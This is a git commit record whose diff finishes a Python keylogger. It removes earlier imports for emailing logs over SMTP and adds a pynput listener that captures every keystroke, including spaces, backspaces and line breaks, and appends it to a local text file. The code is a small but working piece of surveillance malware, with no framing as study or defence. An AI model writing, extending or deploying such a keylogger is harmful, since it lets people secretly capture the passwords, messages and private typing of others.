a99abef675f195426a4e0703de6e8760f8f72253
unknown <lauren@visualstream.com>
2023-07-14 13:52:50 -0700

    simple keylogger finished

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,23 @@
-import keyboard # for keylogs
-import smtplib # sending email via SMTP protocol
+from pynput import keyboard
 
-from threading import Timer
-from datetime import datetime
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
+def keyPressed(key):
+    print(str(key))
+    with open("keyslogged.txt", 'a') as logKey: #append pressed keys to file
+        try:
+            char = key.char
+            logKey.write(char)
+        except AttributeError:
+           if key == keyboard.Key.space: # handles special case of spaces
+               logKey.write(" ")
+           elif key == keyboard.Key.backspace: # handles special case of backspaces
+                logKey.seek(logKey.tell() - 1, 0)
+                logKey.truncate()
+           elif key == keyboard.Key.enter:
+                logKey.write("\n")
+           else:
+               print("Error")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press = keyPressed)
+    listener.start()
+    input()
